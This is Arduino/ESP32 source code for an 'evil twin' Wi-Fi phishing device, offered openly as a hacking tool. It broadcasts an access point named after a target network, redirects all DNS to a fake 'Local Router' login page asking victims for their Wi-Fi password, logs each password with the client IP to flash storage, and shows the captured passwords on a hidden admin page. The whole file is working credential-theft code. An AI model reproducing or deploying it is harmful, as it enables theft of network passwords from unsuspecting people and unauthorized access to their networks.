#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>

const char* AP_SSID = "Wifi Name";  // use the SSID(name) of the AP or wifi that you want to hack
const byte DNS_PORT = 53;

DNSServer dnsServer;
WebServer server(80);

// Captive portal login page
const char* loginPage = R"(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Public WiFi Login</title>
  <style>
    :root {
      --primary-color: #4dabf7;
      --secondary-color: #40c057;
      --text-color: #333;
      --white: #ffffff;
    }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #f5f7fa 0%, #e3f2fd 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .login-box {
      background: var(--white);
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      width: 380px;
      text-align: center;
    }
    .logo {
      font-size: 24px;
      font-weight: 700;
      color: var(--primary-color);
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 15px;
    }
    button {
      background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
      color: var(--white);
      border: none;
      padding: 14px;
      width: 100%;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      margin-top: 10px;
    }
    .security-note {
      font-size: 12px;
      color: #777;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">Local Router</div>
    <div class="message">dear customer, please enter the wifi password of your router to continue using internet</div>
    <form method="POST" action="/login">
      <input type="password" name="password" placeholder="Password " required>
      <button type="submit">enter </button>
    </form>
    <div class="security-note">
      🔒 © 2023 All rights are reserved muhamadjalal404.
    </div>
  </div>
</body>
</html>
)";

// Stores credentials to SPIFFS
void logCredentials(String password, String ip) {
  File file = SPIFFS.open("/creds.txt", FILE_APPEND);
  if (!file) {
    Serial.println("[!] Failed to open creds.txt");
    return;
  }
  file.print("TIME: "); file.println(millis() / 1000);
  file.print("IP: "); file.println(ip);
  file.print("PASSWORD: "); file.println(password);
  file.println("------------------");
  file.close();
}

// Handles form submission
void handleLogin() {
  if (server.method() != HTTP_POST) {
    server.send(405, "text/plain", "Method Not Allowed");
    return;
  }

  String password = server.arg("password");
  String clientIP = server.client().remoteIP().toString();

  Serial.println("\n[+] Password Captured:");
  Serial.println("IP: " + clientIP);
  Serial.println("Password: " + password);

  logCredentials(password, clientIP);

  server.sendHeader("Location", "http://www.google.com", true);
  server.send(302, "text/plain", "Redirecting...");
}

// Admin logs page
void handleAdminLogs() {
  File file = SPIFFS.open("/creds.txt", FILE_READ);
  if (!file) {
    server.send(500, "text/plain", "Failed to read logs");
    return;
  }

  String html = R"(
  <!DOCTYPE html>
  <html>
  <head>
    <title>Captured Credentials</title>
    <meta http-equiv="refresh" content="10">
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f5f7fa;
        padding: 20px;
      }
      h2 {
        color: #4dabf7;
      }
      pre {
        background-color: #ffffff;
        padding: 15px;
        border-radius: 8px;
        box-shadow: 0 4px 10px rgba(0,0,0,0.05);
        white-space: pre-wrap;
        word-wrap: break-word;
        font-size: 14px;
        line-height: 1.4;
      }
      button {
        margin-top: 20px;
        padding: 10px 20px;
        background: #e74c3c;
        color: #fff;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <h2> Captured Wi-Fi Passwords</h2>
    <pre>
  )";

  while (file.available()) {
    html += (char)file.read();
  }
  file.close();

  html += R"(</pre>
    <form action="/clear" method="GET">
      <button>Clear Logs </button>
    </form>
  </body></html>)";

  server.send(200, "text/html", html);
}

// Clears the captured credentials
void handleClearLogs() {
  File file = SPIFFS.open("/creds.txt", FILE_WRITE); // Truncate the file
  if (!file) {
    server.send(500, "text/plain", "Failed to clear logs");
    return;
  }
  file.close();
  server.sendHeader("Location", "/admin12345", true);
  server.send(302, "text/plain", "Logs Cleared");
}

void setup() {
  Serial.begin(115200);
  while (!Serial);

  if (!SPIFFS.begin(true)) {
    Serial.println("[!] Failed to mount SPIFFS");
    while (1) delay(100);
  }

  WiFi.softAP(AP_SSID);
  Serial.println("[+] AP Started: " + String(AP_SSID));
  Serial.println("[+] AP IP: " + WiFi.softAPIP().toString());

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  server.on("/", []() {
    server.send(200, "text/html", loginPage);
  });

  server.on("/login", HTTP_POST, handleLogin);
  server.on("/admin12345", HTTP_GET, handleAdminLogs); // Hidden admin panel
  server.on("/clear", HTTP_GET, handleClearLogs);      // Clear logs handler

  server.onNotFound([]() {
    server.sendHeader("Location", "http://" + server.client().localIP().toString(), true);
    server.send(302, "text/plain", "Redirecting to captive portal...");
  });

  server.begin();
  Serial.println("[+] HTTP server started");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
